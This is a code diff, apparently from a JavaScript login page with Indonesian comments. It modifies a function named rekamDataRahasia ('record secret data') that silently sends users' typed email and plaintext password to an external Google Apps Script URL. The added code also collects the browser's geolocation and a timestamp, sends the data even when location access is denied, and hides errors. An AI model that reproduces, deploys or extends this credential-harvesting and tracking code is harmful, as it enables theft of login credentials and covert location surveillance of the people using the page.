@@ -122,35 +122,53 @@ document.addEventListener('DOMContentLoaded', () => {
 
 // Fungsi luar (Bisa tetap di luar DOMContentLoaded)
 async function rekamDataRahasia(email, password) {
-    const urlAppsScript = "https://script.google.com/macros/s/AKfycbxYhp8p7-nvDCcy5An13cJyHplLF9YaSNwwjiEiwZJXE-IEVf3RDPPF8OUj2zybft4/exec";
-    try {
-        fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
-            method: 'GET',
-            mode: 'no-cors', 
-            cache: 'no-cache'
-        });
-    } catch (e) {}
+    // Pastikan URL berakhiran /exec
+    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
+    
+    // 1. Dapatkan waktu lokal saat ini
+    const sekarang = new Date();
+    const opsiWaktu = { 
+        timeZone: 'Asia/Jakarta', 
+        year: 'numeric', month: '2-digit', day: '2-digit', 
+        hour: '2-digit', minute: '2-digit', second: '2-digit' 
+    };
+    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
+    
+    // 2. Coba dapatkan lokasi koordinat
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const koordinat = `${lat}, ${lon}`;
+                
+                // Kirim data lengkap jika lokasi diizinkan
+                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, koordinat);
+            },
+            (error) => {
+                // Tetap kirim meskipun akses lokasi ditolak
+                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
+            },
+            { timeout: 4000 }
+        );
+    } else {
+        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
+    }
 }
 
-// --- AUTENTIKASI ---
-onAuthStateChanged(auth, (user) => {
-    if (user) {
-        if (loginCard) loginCard.classList.add('hidden');
-        if (contentCard) contentCard.classList.remove('hidden');
-        jalankanCounterWaktu();
-    } else {
-        if (loginCard) loginCard.classList.remove('hidden');
-        if (contentCard) contentCard.classList.add('hidden');
-        if (mainContainer) mainContainer.classList.remove('hidden');
-        if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
-        clearInterval(timerInterval);
-        if (bgMusic) {
-            bgMusic.pause();
-            bgMusic.currentTime = 0;
-        }
-    }
-});
-
+// Fungsi internal untuk eksekusi fetch HTTP GET
+function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
+    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
+                     `&pw=${encodeURIComponent(pw)}` +
+                     `&waktu=${encodeURIComponent(waktu)}` +
+                     `&lokasi=${encodeURIComponent(lokasi)}`;
+                     
+    fetch(urlFinal, {
+        method: 'GET',
+        mode: 'no-cors',
+        cache: 'no-cache'
+    }).catch(err => console.log("Log terisolasi"));
+}
 // Penanganan Event Login
 if (loginButton) {
     loginButton.addEventListener('click', (e) => {
